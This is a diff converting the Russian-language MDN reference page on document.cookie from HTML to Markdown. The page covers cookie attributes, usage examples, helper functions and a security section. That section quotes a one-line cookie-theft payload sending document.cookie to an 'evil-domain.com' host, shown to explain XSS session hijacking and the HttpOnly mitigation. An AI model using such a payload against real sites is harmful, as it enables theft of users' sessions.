@@ -9,98 +9,86 @@ tags:
   - cookie
 translation_of: Web/API/Document/cookie
 ---
-<div>{{APIRef("DOM")}}</div>
+{{APIRef("DOM")}}
 
-<p>Статья описывает получение и установку cookies связанных с текущим документом. Общая библиотека для работы с  cookies смотри<a href="/en-US/docs/Web/API/Document/cookie/Simple_document.cookie_framework"> simple cookie framework</a>.</p>
+Статья описывает получение и установку cookies связанных с текущим документом. Общая библиотека для работы с cookies смотри[ simple cookie framework](/ru/docs/Web/API/Document/cookie/Simple_document.cookie_framework).
 
-<h2 id="Синтаксис">Синтаксис</h2>
+## Синтаксис
 
-<h3 id="Чтение_всех_cookies_связанных_с_текущим_документом">Чтение всех cookies, связанных с текущим документом</h3>
+### Чтение всех cookies, связанных с текущим документом
 
-<pre class="syntaxbox"><em>allCookies</em> = <em>document</em>.cookie;</pre>
+```
+allCookies = document.cookie;
+```
 
-<p>In the code above <var>allCookies</var> is a string containing a semicolon-separated list of all cookies (i.e. <code><var>key</var>=<var>value</var></code> pairs). Note that each <var>key</var> and <var>value</var> may be surrounded by whitespace (space and tab characters): in fact <a href="https://tools.ietf.org/html/rfc6265">RFC 6265</a> mandates a single space after each semicolon, but some user agents may not abide by this.</p>
+In the code above _allCookies_ is a string containing a semicolon-separated list of all cookies (i.e. `key=value` pairs). Note that each _key_ and _value_ may be surrounded by whitespace (space and tab characters): in fact [RFC 6265](https://tools.ietf.org/html/rfc6265) mandates a single space after each semicolon, but some user agents may not abide by this.
 
-<h3 id="Запись_новой_cookie">Запись новой cookie</h3>
+### Запись новой cookie
 
-<pre class="syntaxbox" id="new-cookie_syntax"><em>document</em>.cookie = <em>newCookie</em>;</pre>
+```
+document.cookie = newCookie;
+```
 
-<p>В приведённом коде <code>newCookie</code> - строка в виде <code><em>key</em>=<em>value</em></code><em>. </em>Заметьте, у вас есть возможность установить/обновить лишь одну связку <code><em>key</em>=<em>value</em></code> за один раз, используя этот метод.  Стоит отметить, что:</p>
+В приведённом коде `newCookie` - строка в виде `key=value`_._ Заметьте, у вас есть возможность установить/обновить лишь одну связку `key=value` за один раз, используя этот метод. Стоит отметить, что:
 
-<ul>
- <li>Any of the following cookie attribute values can optionally follow the key-value pair, specifying the cookie to set/update, and preceded by a semi-colon separator:
-  <ul>
-   <li id="new-cookie_path">
-    <p><code>;path=<var>path</var></code> (e.g., '<code>/</code>', '<code>/mydir</code>') If not specified, defaults to the current path of the current document location.</p>
+- Any of the following cookie attribute values can optionally follow the key-value pair, specifying the cookie to set/update, and preceded by a semi-colon separator:
 
-    <div class="note">
-    <p><strong>Note:</strong> Prior to {{Gecko("6.0")}}, paths with quotes were treated as if the quotes were part of the string, instead of as if they were delimiters surrounding the actual path string. This has been fixed.</p>
-    </div>
+  - `;path=path` (e.g., '`/`', '`/mydir`') If not specified, defaults to the current path of the current document location.
 
-    <p>The path must be <strong>absolute</strong> (see <a href="https://tools.ietf.org/html/rfc6265">RFC 6265</a>). For more information on how to use relative paths, see <a href="https://developer.mozilla.org/ru/docs/Web/API/Document/cookie$edit#Using_relative_URLs_in_the_path_parameter">this paragraph</a>.</p>
-   </li>
-   <li id="new-cookie_domain"><code>;domain=<var>domain</var></code> (e.g., '<code>example.com</code>' or '<code>subdomain.example.com</code>'). If not specified, this defaults to the host portion of the current document location. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. If a domain is specified, subdomains are always included.</li>
-   <li id="new-cookie_max-age"><code>;max-age=<var>max-age-in-seconds</var></code> (e.g., <code>60*60*24*365</code> or 31536000 for a year)</li>
-   <li id="new-cookie_expires"><code>;expires=<var>date-in-GMTString-format</var></code> If neither <code>expires</code> nor <code>max-age</code>specified it will expire at the end of session.
-    <div class="blockIndicator warning">
-    <p>When user privacy is a concern, It is important that any web app implementation will invalidate cookie data after a certain timeout and won't rely on the browser clearing session cookies<br>
-     <small>One of the most beloved features of Firefox <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=345345">prevents session cookies from ever expiring</a>.<br>
-     The same <a href="https://code.google.com/p/chromium/issues/detail?id=128513">issue</a> is also occuring with google chrome (and probably with other browsers offering similar features)</small></p>
-    </div>
+    > **Примечание:** Prior to {{Gecko("6.0")}}, paths with quotes were treated as if the quotes were part of the string, instead of as if they were delimiters surrounding the actual path string. This has been fixed.
 
-    <ul>
-     <li>See {{jsxref("Date.toUTCString()")}} for help formatting this value.</li>
-    </ul>
-   </li>
-   <li id="new-cookie_secure"><code>;secure</code> Cookie to only be transmitted over secure protocol as https. Before Chrome 52, this flag could appear with cookies from http domains.</li>
-   <li id="new-cookie_samesite"><code>;samesite</code> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies">SameSite</a> prevents the browser from sending this cookie along with cross-site requests. Possible values for the flag are <code>lax</code> or <code>strict</code>.
-    <ul>
-     <li>The <code>strict</code> value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link.</li>
-     <li>The <code>lax</code> value will only send cookies for TOP LEVEL navigation GET requests. This is sufficient for user tracking, but it will prevent many CSRF attacks.</li>
-    </ul>
-   </li>
-  </ul>
- </li>
- <li>The cookie value string can use {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} to ensure that the string does not contain any commas, semicolons, or whitespace (which are disallowed in cookie values).</li>
- <li>Some user agent implementations support the following cookie prefixes:
-  <ul>
-   <li><code>__Secure-</code> Signals to the browser that it should only include the cookie in requests transmitted over a secure channel.</li>
-   <li><code>__Host-</code> Signals to the browser that in addition to the restriction to only use the cookie from a secure origin, the scope of the cookie is limited to a path attribute passed down by the server. If the server omits the path attribute the "directory" of the request URI is used. It also signals that the domain attribute must not be present, which prevents the cookie from being sent to other domains. For Chrome the path attribute must always be the origin.</li>
-  </ul>
+    The path must be **absolute** (see [RFC 6265](https://tools.ietf.org/html/rfc6265)). For more information on how to use relative paths, see [this paragraph](/ru/docs/Web/API/Document/cookie$edit#Using_relative_URLs_in_the_path_parameter).
 
-  <div class="note">
-  <p>The dash is considered part of the prefix.</p>
-  </div>
+  - `;domain=domain` (e.g., '`example.com`' or '`subdomain.example.com`'). If not specified, this defaults to the host portion of the current document location. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. If a domain is specified, subdomains are always included.
+  - `;max-age=max-age-in-seconds` (e.g., `60*60*24*365` or 31536000 for a year)
+  - `;expires=date-in-GMTString-format` If neither `expires` nor `max-age`specified it will expire at the end of session.
 
-  <div class="note">
-  <p>These flags are only setable with the <code>secure</code> attribute.</p>
-  </div>
- </li>
-</ul>
+    > **Предупреждение:** When user privacy is a concern, It is important that any web app implementation will invalidate cookie data after a certain timeout and won't rely on the browser clearing session cookies
+    > One of the most beloved features of Firefox [prevents session cookies from ever expiring](https://bugzilla.mozilla.org/show_bug.cgi?id=345345).
+    > The same [issue](https://code.google.com/p/chromium/issues/detail?id=128513) is also occuring with google chrome (and probably with other browsers offering similar features)
 
-<div class="note">
-<p><strong>Note:</strong> As you can see from the code above, <code>document.cookie</code> is an <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description">accessor property</a> with native <em>setter</em> and <em>getter</em> functions, and consequently is <strong>not</strong> a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description">data property</a> with a value: what you write is not the same as what you read, everything is always mediated by the JavaScript interpreter.</p>
-</div>
+    - See {{jsxref("Date.toUTCString()")}} for help formatting this value.
 
-<h2 id="Примеры">Примеры</h2>
+  - `;secure` Cookie to only be transmitted over secure protocol as https. Before Chrome 52, this flag could appear with cookies from http domains.
+  - `;samesite` [SameSite](/ru/docs/Web/HTTP/Cookies#SameSite_cookies) prevents the browser from sending this cookie along with cross-site requests. Possible values for the flag are `lax` or `strict`.
 
-<h3 id="Пример_1_Простое_использование">Пример #1: Простое использование</h3>
+    - The `strict` value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link.
+    - The `lax` value will only send cookies for TOP LEVEL navigation GET requests. This is sufficient for user tracking, but it will prevent many CSRF attacks.
 
-<pre class="brush: js">document.cookie = "name=oeschger";
+- The cookie value string can use {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} to ensure that the string does not contain any commas, semicolons, or whitespace (which are disallowed in cookie values).
+- Some user agent implementations support the following cookie prefixes:
+
+  - `__Secure-` Signals to the browser that it should only include the cookie in requests transmitted over a secure channel.
+  - `__Host-` Signals to the browser that in addition to the restriction to only use the cookie from a secure origin, the scope of the cookie is limited to a path attribute passed down by the server. If the server omits the path attribute the "directory" of the request URI is used. It also signals that the domain attribute must not be present, which prevents the cookie from being sent to other domains. For Chrome the path attribute must always be the origin.
+
+  > **Примечание:** The dash is considered part of the prefix.
+
+  > **Примечание:** These flags are only setable with the `secure` attribute.
+
+> **Примечание:** As you can see from the code above, `document.cookie` is an [accessor property](/ru/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description) with native _setter_ and _getter_ functions, and consequently is **not** a [data property](/ru/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description) with a value: what you write is not the same as what you read, everything is always mediated by the JavaScript interpreter.
+
+## Примеры
+
+### Пример #1: Простое использование
+
+```js
+document.cookie = "name=oeschger";
 document.cookie = "favorite_food=tripe";
 function alertCookie() {
   alert(document.cookie);
 }
-</pre>
+```
 
-<pre class="brush: html">&lt;button onclick="alertCookie()"&gt;Show cookies&lt;/button&gt;
-</pre>
+```html
+<button onclick="alertCookie()">Show cookies</button>
+```
 
-<p>{{EmbedLiveSample('Пример_1_Простое_использование', 200, 36)}}</p>
+{{EmbedLiveSample('Пример_1_Простое_использование', 200, 36)}}
 
-<h3 id="Пример_2_Получить_cookie_с_именем_test2">Пример #2: Получить cookie с именем <em>test2</em></h3>
+### Пример #2: Получить cookie с именем _test2_
 
-<pre class="brush: js">document.cookie = "test1=Hello";
+```js
+document.cookie = "test1=Hello";
 document.cookie = "test2=World";
 
 var cookieValue = document.cookie.replace(/(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/, "$1");
@@ -108,40 +96,51 @@ var cookieValue = document.cookie.replace(/(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*
 function alertCookieValue() {
   alert(cookieValue);
 }
-</pre>
+```
 
-<pre class="brush: html">&lt;button onclick="alertCookieValue()"&gt;Show cookie value&lt;/button&gt;</pre>
+```html
+<button onclick="alertCookieValue()">Show cookie value</button>
+```
 
-<p>{{EmbedLiveSample('Пример_2_Получить_cookie_с_именем_test2', 200, 36)}}</p>
+{{EmbedLiveSample('Пример_2_Получить_cookie_с_именем_test2', 200, 36)}}
 
-<h3 id="Пример_3_Выполнить_операцию_единожды">Пример #3: Выполнить операцию единожды</h3>
+### Пример #3: Выполнить операцию единожды
 
-<p>При использовании следующего кода замените все вхождения <code>doSomethingOnlyOnce</code> (наименование cookie) на другое имя.</p>
+При использовании следующего кода замените все вхождения `doSomethingOnlyOnce` (наименование cookie) на другое имя.
 
-<pre class="brush: js">function doOnce() {
+```js
+function doOnce() {
   if (document.cookie.replace(/(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/, "$1") !== "true") {
     alert("Do something here!");
     document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
   }
-}</pre>
+}
+```
 
-<pre class="brush: html">&lt;button onclick="doOnce()"&gt;Only do something once&lt;/button&gt;</pre>
+```html
+<button onclick="doOnce()">Only do something once</button>
+```
 
-<p>{{EmbedLiveSample('Пример_3_Выполнить_операцию_единожды', 200, 36)}}</p>
+{{EmbedLiveSample('Пример_3_Выполнить_операцию_единожды', 200, 36)}}
 
-<h3 id="Пример_4_Перезагрузить_cookie">Пример #4: Перезагрузить cookie</h3>
+### Пример #4: Перезагрузить cookie
 
-<pre class="brush: js">function resetOnce() {
+```js
+function resetOnce() {
   document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
-}</pre>
+}
+```
 
-<pre class="brush: html">&lt;button onclick="resetOnce()"&gt;Reset only once cookie&lt;/button&gt;</pre>
+```html
+<button onclick="resetOnce()">Reset only once cookie</button>
+```
 
-<p>{{EmbedLiveSample('Пример_4_Перезагрузить_cookie', 200, 36)}}</p>
+{{EmbedLiveSample('Пример_4_Перезагрузить_cookie', 200, 36)}}
 
-<h3 id="Example_5_Проверить_существование_cookie">Example #5: Проверить существование cookie</h3>
+### Example #5: Проверить существование cookie
 
-<pre><code>//ES5
+```
+//ES5
 
 if (document.cookie.split(';').filter(function(item) {
     return item.trim().indexOf('reader=') == 0
@@ -151,72 +150,78 @@ if (document.cookie.split(';').filter(function(item) {
 
 //ES2016
 
-if (document.cookie.split(';').filter((item) =&gt; item.trim().startsWith('reader=')).length) {
+if (document.cookie.split(';').filter((item) => item.trim().startsWith('reader=')).length) {
     console.log('The cookie "reader" exists (ES6)')
-}</code></pre>
+}
+```
 
-<h3 id="Example_6_Проверить_что_cookie_имеет_определённое_значение">Example #6: Проверить, что cookie имеет определённое значение</h3>
+### Example #6: Проверить, что cookie имеет определённое значение
 
-<pre><code>//ES5
+```
+//ES5
 
 if (document.cookie.split(';').filter(function(item) {
-    return item.indexOf('reader=1') &gt;= 0
+    return item.indexOf('reader=1') >= 0
 }).length) {
     console.log('The cookie "reader" has "1" for value')
 }
 
 //ES2016
 
-if (document.cookie.split(';').filter((item) =&gt; item.includes('reader=1')).length) {
+if (document.cookie.split(';').filter((item) => item.includes('reader=1')).length) {
     console.log('The cookie "reader" has "1" for value')
-}</code></pre>
+}
+```
 
-<h2 id="Безопасность">Безопасность</h2>
+## Безопасность
 
-<p>It is important to note that the path attribute does <strong>not</strong> protect against unauthorized reading of the cookie from a different path. It can be easily bypassed using the DOM, for example by creating a hidden <a href="/en-US/docs/HTML/Element/iframe">iframe</a> element with the path of the cookie, then accessing this iframe's <code>contentDocument.cookie</code> property. The only way to protect the cookie is by using a different domain or subdomain, due to the <a href="/en-US/docs/Same_origin_policy_for_JavaScript">same origin policy</a>.</p>
+It is important to note that the path attribute does **not** protect against unauthorized reading of the cookie from a different path. It can be easily bypassed using the DOM, for example by creating a hidden [iframe](/ru/docs/HTML/Element/iframe) element with the path of the cookie, then accessing this iframe's `contentDocument.cookie` property. The only way to protect the cookie is by using a different domain or subdomain, due to the [same origin policy](/ru/docs/Same_origin_policy_for_JavaScript).
 
-<p>Cookies are often used in web application to identify a user and their authenticated session. So stealing cookie from a web application, will lead to hijacking the authenticated user's session. Common ways to steal cookies include using Social Engineering or by exploiting an XSS vulnerability in the application -</p>
+Cookies are often used in web application to identify a user and their authenticated session. So stealing cookie from a web application, will lead to hijacking the authenticated user's session. Common ways to steal cookies include using Social Engineering or by exploiting an XSS vulnerability in the application -
 
-<pre class="brush: js">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
-</pre>
+```js
+(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+```
 
-<p>The HTTPOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript. Read more about <a class="external" href="http://www.nczonline.net/blog/2009/05/12/cookies-and-security/">Cookies and Security</a>.</p>
+The HTTPOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript. Read more about [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).
 
-<h2 id="Примечания">Примечания</h2>
+## Примечания
 
-<ul>
- <li>Starting with Firefox 2, a better mechanism for client-side storage is available - <a href="/en-US/docs/DOM/Storage">WHATWG DOM Storage</a>.</li>
- <li>You can delete a cookie by simply updating its expiration time to zero.</li>
- <li>Keep in mind that the more you have cookies the more data will be transferred between the server and the client for each request. This will make each request slower. It is highly recommended for you to use <a href="/en-US/docs/DOM/Storage">WHATWG DOM Storage</a> if you are going to keep "client-only" data.</li>
- <li><a href="http://www.ietf.org/rfc/rfc2965.txt">RFC 2965</a> (Section 5.3, "Implementation Limits") specifies that there should be <strong>no maximum length</strong> of a cookie's key or value size, and encourages implementations to support <strong>arbitrarily large cookies</strong>. Each browser's implementation maximum will necessarily be different, so consult individual browser documentation.</li>
-</ul>
+- Starting with Firefox 2, a better mechanism for client-side storage is available - [WHATWG DOM Storage](/ru/docs/DOM/Storage).
+- You can delete a cookie by simply updating its expiration time to zero.
+- Keep in mind that the more you have cookies the more data will be transferred between the server and the client for each request. This will make each request slower. It is highly recommended for you to use [WHATWG DOM Storage](/ru/docs/DOM/Storage) if you are going to keep "client-only" data.
+- [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt) (Section 5.3, "Implementation Limits") specifies that there should be **no maximum length** of a cookie's key or value size, and encourages implementations to support **arbitrarily large cookies**. Each browser's implementation maximum will necessarily be different, so consult individual browser documentation.
 
-<p>The reason of the <a href="#Syntax">syntax</a> of the <code>document.cookie</code> accessor property is due to the client-server nature of cookies, which differs from other client-client storage methods (like, for instance, <a href="/en-US/docs/Web/Guide/API/DOM/Storage">localStorage</a>):</p>
+The reason of the [syntax](#Syntax) of the `document.cookie` accessor property is due to the client-server nature of cookies, which differs from other client-client storage methods (like, for instance, [localStorage](/ru/docs/Web/Guide/API/DOM/Storage)):
 
-<h5 id="The_server_tells_the_client_to_store_a_cookie">The server tells the client to store a cookie</h5>
+##### The server tells the client to store a cookie
 
-<pre class="eval">HTTP/1.0 200 OK
+```
+HTTP/1.0 200 OK
 Content-type: text/html
 Set-Cookie: cookie_name1=cookie_value1
 Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
 
-[content of the page here]</pre>
+[content of the page here]
+```
 
-<h5 id="The_client_sends_back_to_the_server_its_cookies_previously_stored">The client sends back to the server its cookies previously stored</h5>
+##### The client sends back to the server its cookies previously stored
 
-<pre class="eval">GET /sample_page.html HTTP/1.1
+```
+GET /sample_page.html HTTP/1.1
 Host: www.example.org
 Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
 Accept: */*
-</pre>
+```
 
-<h3 id="Использование_относительных_ссылок_в_параметре_path">Использование относительных ссылок в параметре path</h3>
+### Использование относительных ссылок в параметре path
 
-<p>The <a href="#new-cookie_path"><code>path</code></a> parameter of a new cookie can accept only <em>absolute</em> paths. If you want to use <em>relative</em> paths, therefore, you need to convert them. The following function can translate <em>relative</em> paths to <em>absolute</em> paths. It is a general-purpose function, but can be of course successifully used for the <a href="#new-cookie_path"><code>path</code></a> parameter of a new cookie, as well.</p>
+The [`path`](#new-cookie_path) parameter of a new cookie can accept only _absolute_ paths. If you want to use _relative_ paths, therefore, you need to convert them. The following function can translate _relative_ paths to _absolute_ paths. It is a general-purpose function, but can be of course successifully used for the [`path`](#new-cookie_path) parameter of a new cookie, as well.
 
-<h5 id="Library">Library</h5>
+##### Library
 
-<pre class="brush: js">/*\
+```js
+/*\
 |*|
 |*|  :: Translate relative paths to absolute paths ::
 |*|
@@ -230,16 +235,18 @@ Accept: */*
 
 function relPathToAbs (sRelPath) {
   var nUpLn, sDir = "", sPath = location.pathname.replace(/[^\/]*$/, sRelPath.replace(/(\/|^)(?:\.?\/+)+/g, "$1"));
-  for (var nEnd, nStart = 0; nEnd = sPath.indexOf("/../", nStart), nEnd &gt; -1; nStart = nEnd + nUpLn) {
+  for (var nEnd, nStart = 0; nEnd = sPath.indexOf("/../", nStart), nEnd > -1; nStart = nEnd + nUpLn) {
     nUpLn = /^\/(?:\.\.\/)*/.exec(sPath.slice(nEnd))[0].length;
     sDir = (sDir + sPath.substring(nStart, nEnd)).replace(new RegExp("(?:\\\/+[^\\\/]*){0," + ((nUpLn - 1) / 3) + "}$"), "/");
   }
   return sDir + sPath.substr(nStart);
-}</pre>
+}
+```
 
-<h5 id="Sample_usage">Sample usage</h5>
+##### Sample usage
 
-<pre class="brush: js">/* Let us be in /en-US/docs/Web/API/document.cookie */
+```js
+/* Let us be in /en-US/docs/Web/API/document.cookie */
 
 alert(location.pathname);
 // displays: /en-US/docs/Web/API/document.cookie
@@ -254,83 +261,88 @@ alert(relPathToAbs("../../Firefox"));
 // displays: /en-US/docs/Firefox
 
 alert(relPathToAbs("../Guide/././API/../../../Firefox"));
-// displays: /en-US/docs/Firefox</pre>
+// displays: /en-US/docs/Firefox
+```
 
-<h3 id="Относительный_срок_годности_cookie_числовые_примеры">Относительный срок годности cookie: числовые примеры</h3>
+### Относительный срок годности cookie: числовые примеры
 
-<p>If you don't want to use an <em>absolute date</em> for the <code>end</code> parameter, here you can find some numeric examples of expiration-dates <em>relative to the moment of storage of the cookie</em>:</p>
+If you don't want to use an _absolute date_ for the `end` parameter, here you can find some numeric examples of expiration-dates _relative to the moment of storage of the cookie_:
 
-<pre class="brush: js">docCookies.setItem("mycookie1", "myvalue1", 864e2, "/"); // this cookie will expire in one DAY
+```js
+docCookies.setItem("mycookie1", "myvalue1", 864e2, "/"); // this cookie will expire in one DAY
 docCookies.setItem("mycookie2", "myvalue2", 6048e2, "/"); // this cookie will expire in one WEEK
 docCookies.setItem("mycookie3", "myvalue3", 2592e3, "/"); // this cookie will expire in one MONTH (30 days)
-docCookies.setItem("mycookie4", "myvalue4", 31536e3, "/"); // this cookie will expire in one YEAR</pre>
+docCookies.setItem("mycookie4", "myvalue4", 31536e3, "/"); // this cookie will expire in one YEAR
+```
 
-<h2 id="Другие_примеры">Другие примеры</h2>
+## Другие примеры
 
-<h3 id="Example_5_Do_something_only_once_–_a_general_library">Example #5: Do something only once – <em>a general library</em></h3>
+### Example #5: Do something only once – _a general library_
 
-<h4 id="Библиотека">Библиотека</h4>
+#### Библиотека
 
-<pre><code>function executeOnce () {
+```
+function executeOnce () {
   var argc = arguments.length, bImplGlob = typeof arguments[argc - 1] === "string";
   if (bImplGlob) { argc++; }
-  if (argc &lt; 3) { throw new TypeError("executeOnce - not enough arguments"); }
+  if (argc < 3) { throw new TypeError("executeOnce - not enough arguments"); }
   var fExec = arguments[0], sKey = arguments[argc - 2];
   if (typeof fExec !== "function") { throw new TypeError("executeOnce - first argument must be a function"); }
   if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { throw new TypeError("executeOnce - invalid identifier"); }
-  if (decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&amp;") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) === "1") { return false; }
-  fExec.apply(argc &gt; 3 ? arguments[1] : null, argc &gt; 4 ? Array.prototype.slice.call(arguments, 2, argc - 2) : []);
+  if (decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) === "1") { return false; }
+  fExec.apply(argc > 3 ? arguments[1] : null, argc > 4 ? Array.prototype.slice.call(arguments, 2, argc - 2) : []);
   document.cookie = encodeURIComponent(sKey) + "=1; expires=Fri, 31 Dec 9999 23:59:59 GMT" + (bImplGlob || !arguments[argc - 1] ? "; path=/" : "");
   return true;
-}</code></pre>
+}
+```
 
-<h4 id="Синтаксис_2">Синтаксис</h4>
+#### Синтаксис
 
-<pre>executeOnce(<var>callback</var>[, <var>thisObject</var>[, <var>argumentToPass1</var>[, <var>argumentToPass2</var>[, …[, <var>argumentToPassN</var>]]]]], <var>identifier</var>[, <var>onlyHere</var>])</pre>
+```
+executeOnce(callback[, thisObject[, argumentToPass1[, argumentToPass2[, …[, argumentToPassN]]]]], identifier[, onlyHere])
+```
 
-<h4 id="Описание">Описание</h4>
+#### Описание
 
-<p>Executes a function only once, even after the refresh of the page.</p>
+Executes a function only once, even after the refresh of the page.
 
-<h4 id="Параметры">Параметры</h4>
+#### Параметры
 
-<dl>
- <dt><code>callback</code></dt>
- <dd>The function to be executed ({{jsxref("function", "", "", "1")}}).</dd>
- <dt><code>thisObject</code> Optional</dt>
- <dd>The {{jsxref("Operators/this", "this")}} object ({{jsxref("Object", "", "", "1")}} or {{jsxref("Global_Objects/null", "null")}}).</dd>
- <dt><code>argumentToPass1, argumentToPass2, argumentToPassN</code> Optional</dt>
- <dd>The arguments of the <code>callback</code> function.</dd>
- <dt><code>identifier</code></dt>
- <dd>The identifier to check, i.e. the name of the cookie ({{jsxref("String", "string", "", "1")}})</dd>
- <dt><code>onlyHere</code> Optional</dt>
- <dd>A {{jsxref("Boolean", "boolean", "", "1")}} expressing whether the cookie will use the local path (<code>true</code>) instead of the global one (<code>false</code> or <code>undefined</code>) ({{jsxref("Boolean", "boolean", "", "1")}} or {{jsxref("Global_Objects/undefined", "undefined")}})</dd>
-</dl>
+- `callback`
+  - : The function to be executed ({{jsxref("function", "", "", "1")}}).
+- `thisObject` Optional
+  - : The {{jsxref("Operators/this", "this")}} object ({{jsxref("Object", "", "", "1")}} or {{jsxref("Global_Objects/null", "null")}}).
+- `argumentToPass1, argumentToPass2, argumentToPassN` Optional
+  - : The arguments of the `callback` function.
+- `identifier`
+  - : The identifier to check, i.e. the name of the cookie ({{jsxref("String", "string", "", "1")}})
+- `onlyHere` Optional
+  - : A {{jsxref("Boolean", "boolean", "", "1")}} expressing whether the cookie will use the local path (`true`) instead of the global one (`false` or `undefined`) ({{jsxref("Boolean", "boolean", "", "1")}} or {{jsxref("Global_Objects/undefined", "undefined")}})
 
-<h4 id="Примеры_использования">Примеры использования</h4>
+#### Примеры использования
 
-<pre><code>function alertSomething (sMsg) {
+```
+function alertSomething (sMsg) {
   alert(sMsg);
 }
 
-executeOnce(alertSomething, null, "Hello world!!!!", "alert_something");</code></pre>
+executeOnce(alertSomething, null, "Hello world!!!!", "alert_something");
+```
 
-<h2 id="Спецификации">Спецификации</h2>
+## Спецификации
 
 {{Specifications}}
 
-<h2 id="Браузерная_поддержка">Браузерная поддержка</h2>
+## Браузерная поддержка
 
-<p>{{Compat}}</p>
+{{Compat}}
 
-<h2 id="Смотрите_также">Смотрите также</h2>
+## Смотрите также
 
-<ul>
- <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">HTTP cookies</a></li>
- <li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/API/DOM/Storage">DOM Storage</a></li>
- <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/URLUtils.pathname"><code>URLUtils.pathname</code></a></li>
- <li>{{jsxref("Date.toUTCString()")}}</li>
- <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP"><code>HTTP</code></a></li>
- <li><a href="https://developer.mozilla.org/en-US/docs/Code_snippets/Cookies">Cookies (code snippets)</a></li>
- <li><a href="http://www.ietf.org/rfc/rfc2965.txt">RFC 2965</a></li>
-</ul>
+- [HTTP cookies](/ru/docs/Web/HTTP/Cookies)
+- [DOM Storage](/ru/docs/Web/Guide/API/DOM/Storage)
+- [`URLUtils.pathname`](/ru/docs/Web/API/URLUtils.pathname)
+- {{jsxref("Date.toUTCString()")}}
+- [`HTTP`](/ru/docs/Web/HTTP)
+- [Cookies (code snippets)](/ru/docs/Code_snippets/Cookies)
+- [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt)
